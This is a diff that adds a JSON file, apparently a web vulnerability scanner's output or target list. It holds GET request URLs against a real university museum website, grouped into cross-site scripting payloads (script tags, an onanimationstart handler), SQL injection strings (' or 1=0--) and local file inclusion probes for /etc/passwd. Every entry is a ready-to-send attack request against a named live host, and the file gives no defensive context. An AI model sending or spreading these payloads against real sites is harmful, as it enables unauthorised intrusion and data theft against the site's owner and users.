@@ -1,0 +1,244 @@
+{
+    "XSS": [
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m10_1.asp?main=<script>alert('XSS')</script>"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m10_2.asp?main=<script>alert('XSS')</script>"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m1_1.asp?main=<script>alert('XSS')</script>"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m1_2.asp?main=<script>alert('XSS')</script>"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m1_3.asp?main=<script>alert('XSS')</script>"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m1_4.asp?main=<script>alert('XSS')</script>"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m1_5.asp?main=<script>alert('XSS')</script>"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m5_1.asp?main=<script>alert('XSS')</script>"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m5_2.asp?main=<script>alert('XSS')</script>"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m5_3.asp?main=<script>alert('XSS')</script>"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m5_4.asp?main=<script>alert('XSS')</script>"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m5_5.asp?main=<script>alert('XSS')</script>"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m8_1.asp?main=<script>alert('XSS')</script>"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m8_2.asp?main=<script>alert('XSS')</script>"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m8_3.asp?main=<script>alert('XSS')</script>"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m8_4.asp?main=<script>alert('XSS')</script>"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m9_1.asp?main=<script>alert('XSS')</script>"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m9_1.asp?main=<script>alert('XSS')</script>&intcate=0"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/sitemap.asp?main=<script>alert('XSS')</script>"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/tooltool.asp?main=<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationstart=\"alert(1)\"></xss>"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/index.asp/html/m1_1.asp?main=<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationstart=\"alert(1)\"></xss>"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/index.asp/javascript:openBrWindowP('scp/month.asp?intno=<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationstart=\"alert(1)\"></xss>&yes,width=640,height"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/javascript:openBrWindowP('scp/month.asp?intno=<script>alert('XSS')</script>&yes,width=640,height"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/scp/board.asp?main=<script>alert('XSS')</script>&ikno=1"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/scp/catalog.asp?main=<script>alert('XSS')</script>&intcate=1"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/scp/m2_3.asp?main=<script>alert('XSS')</script>"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/scp/m2_4.asp?main=<script>alert('XSS')</script>"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/scp/m3_1.asp?main=<script>alert('XSS')</script>&intcate=11"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/scp/m3_1con.asp?main=<script>alert('XSS')</script>&intcate=0"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/scp/photogallery.asp?main=<script>alert('XSS')</script>"
+        }
+    ],
+    "SQLI": [
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m10_1.asp?main=111' or 1=0"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m10_2.asp?main=112' or 1=0--"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m1_1.asp?main=11' or 1=0"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m1_2.asp?main=12' or 1=0--"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m1_3.asp?main=13' or 1=0"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m1_4.asp?main=14' or 1=0--"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m1_5.asp?main=15' or 1=0"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m5_1.asp?main=51' or 1=0--"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m5_2.asp?main=52' or 1=0"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m5_3.asp?main=53' or 1=0--"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m5_4.asp?main=54' or 1=0"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m5_5.asp?main=55' or 1=0--"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m8_1.asp?main=81' or 1=0"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m8_2.asp?main=82' or 1=0--"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m8_3.asp?main=83' or 1=0"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m8_4.asp?main=84' or 1=0--"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m9_1.asp?main=102' or 1=0"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/m9_1.asp?main=102' or 1=0&intcate=0"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/sitemap.asp?main=90' or 1=0--"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/html/tooltool.asp?main=101' or 1=0--"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/scp/board.asp?main=3' or 1=0&ikno=1"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/scp/catalog.asp?main=42' or 1=0&intcate=1"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/scp/m2_3.asp?main=23' or 1=0--"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/scp/m2_4.asp?main=24' or 1=0"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/scp/m3_1.asp?main=31' or 1=0&intcate=11"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/scp/m3_1con.asp?main=31' or 1=0&intcate=0"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/scp/photogallery.asp?main=4' or 1=0--"
+        }
+    ],
+    "LFI": [
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/index.asp/html/m1_1.asp?main=/etc/passwd"
+        },
+        {
+            "method": "GET",
+            "url": "http://museum.ajou.ac.kr:80/index.asp/javascript:openBrWindowP('scp/month.asp?intno=/etc/passwd&yes,width=640,height"
+        }
+    ]
+}
